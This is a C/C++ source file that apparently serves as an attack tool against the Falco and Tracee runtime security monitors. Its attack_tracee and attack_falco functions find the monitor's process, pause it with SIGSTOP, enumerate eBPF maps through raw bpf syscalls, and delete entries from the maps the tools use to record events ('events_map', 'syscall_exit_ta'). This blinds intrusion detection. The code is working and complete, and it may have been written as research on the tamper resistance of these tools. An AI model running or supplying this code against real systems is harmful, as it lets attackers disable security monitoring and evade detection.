#include <stdio.h>
#include <stdlib.h>
#include <linux/bpf.h>
#include <linux/if_link.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <string.h>

#include <iostream>
#include <string>

#define BPF_OBJ_NAME_LEN 16U

const size_t attr_sz = sizeof(union bpf_attr);
const __u32 info_len = sizeof(struct bpf_map_info);

struct bpf_get_fd_by_id_opts {
    size_t sz; /* size of this struct for forward/backward compatibility */
    __u32 open_flags; /* permissions requested for the operation on fd */
    size_t :0;
};

int sys_bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(SYS_bpf, cmd, attr, size);
}
int bpf_map_delete_elem(int fd, const void *key) {
    union bpf_attr attr;
    int ret;

    memset(&attr, 0, attr_sz);
    attr.map_fd = fd;
    attr.key = (__u64) key;

    return sys_bpf(BPF_MAP_DELETE_ELEM, &attr, attr_sz);
}

int bpf_map_get_next_key(int fd, const void *key, void *next_key)
{
    union bpf_attr attr;
    int ret;

    memset(&attr, 0, attr_sz);
    attr.map_fd = fd;
    attr.key = (__u64) key;
    attr.next_key = (__u64) next_key;

    return sys_bpf(BPF_MAP_GET_NEXT_KEY, &attr, attr_sz);
}

int bpf_obj_get_info_by_fd(int bpf_fd, void *info) {
    union bpf_attr attr;
    int err;
    memset(&attr, 0, attr_sz);
    attr.info.bpf_fd = bpf_fd;
    attr.info.info_len = info_len;
    attr.info.info = (__u64) info;

    err = sys_bpf(BPF_OBJ_GET_INFO_BY_FD, &attr, attr_sz);
    return err;
}

int bpf_map_get_fd_by_id_opts(__u32 id,
                  const struct bpf_get_fd_by_id_opts *opts) {
    union bpf_attr attr;
    int fd;


    memset(&attr, 0, attr_sz);
    attr.map_id = id;
    attr.open_flags = 0;

    fd = sys_bpf(BPF_MAP_GET_FD_BY_ID, &attr, attr_sz);
    return fd;
}

int bpf_map_get_fd_by_id(__u32 id) {
    return bpf_map_get_fd_by_id_opts(id, NULL);
}


static int bpf_obj_get_next_id(__u32 start_id, __u32 *next_id, int cmd) {
    union bpf_attr attr;
    int err;

    memset(&attr, 0, attr_sz);
    attr.start_id = start_id;

    err = sys_bpf(cmd, &attr, attr_sz);
    if (!err)
        *next_id = attr.next_id;

    return err;
}

int bpf_map_get_next_id(__u32 start_id, __u32 *next_id) {
    return bpf_obj_get_next_id(start_id, next_id, BPF_MAP_GET_NEXT_ID);
}

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <filesystem>

#include <signal.h>
#include <unistd.h>

pid_t findProcessByName(const std::string& name) {
    std::filesystem::directory_iterator procIterator("/proc");

    for (const auto& entry : procIterator) {
        if (entry.is_directory()) {
            std::string pid = entry.path().filename();

            std::string commFilePath = "/proc/" + pid + "/comm";
            std::ifstream commFile(commFilePath);

            if (commFile.is_open()) {
                std::string processName;
                std::getline(commFile, processName);
                if (processName == name) {
                    return std::stoi(pid);
                }

                commFile.close();
            }
        }
    }
    std::cerr << "Could not find procname " << name << std::endl;
    exit(1);
    return 0; // Process not found
}

pid_t pause_proc(const std::string &procname) {
    pid_t pid = 0;
    if (procname == "tracee" || procname == "falco") {
        pid = findProcessByName(procname);
        kill(pid, SIGSTOP);
    }
    return pid;
}

void unpause_proc(int pid) {
    kill(pid, SIGCONT);
}

constexpr char FALCO[] = "falco";
constexpr char TRACEE[] = "tracee";

void print_file_contents(const std::string &filename) {
    std::ifstream file(filename);

    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            std::cout << line << std::endl;
        }
        file.close();
    } else {
        std::cerr << "Error opening file: " << filename << std::endl;
    }
}

void attack_tracee() {
    pid_t pid = pause_proc(TRACEE);
    __u32 id = 0;
    while (bpf_map_get_next_id(id, &id) == 0) {
        struct bpf_get_fd_by_id_opts opts = {};
        struct bpf_map_info info = {};
        int fd = bpf_map_get_fd_by_id_opts(id, &opts);
        bpf_obj_get_info_by_fd(fd, &info);
        if (strcmp(info.name, "events_map") == 0) {
            __u32 key = 0;
            while (key < 8020) {
                bpf_map_delete_elem(fd, &key);
                key++;
            }
        }
        close(fd);
    }
    print_file_contents("/proc/sys/kernel/randomize_va_space");
    unpause_proc(pid);
}

static int buf_process_sample(void *ctx, void *data, size_t len) {
    return 0;
}

// #include <bpf/bpf_helper_defs.h>
#include <linux/bpf_common.h>
#include <bpf/libbpf.h>
void attack_falco() {
    char buf[4096] = {};
    pid_t pid = pause_proc(FALCO);
    // print_file_contents("/etc/pam.conf");
    __u32 id = 0;
    while (bpf_map_get_next_id(id, &id) == 0) {
        struct bpf_get_fd_by_id_opts opts = {};
        struct bpf_map_info info = {};
        int fd = bpf_map_get_fd_by_id_opts(id, &opts);
        bpf_obj_get_info_by_fd(fd, &info);
        std::string map_name = std::string(info.name);
        if (map_name == "syscall_exit_ta") {
            std::cout << "Targeting map " << map_name << std::endl;
            __u32 key = 0;
            while (key < 512) {
                if (bpf_map_delete_elem(fd, &key) == 0) {
                    std::cout << "\tDeleted key " << key << " from " << map_name << std::endl;
                }
                key++;
            }

        }
        close(fd);
    }

    unpause_proc(pid);
}

int main(int argc, char *argv[]) {
    char *target = NULL;
    if (argc == 2) {
        target = argv[1];
    } else {
        return 0;
    }

    if (strcmp(target, TRACEE) == 0) {
        attack_tracee();
    } else if (strcmp(target, FALCO) == 0) {
        attack_falco();
    }
}


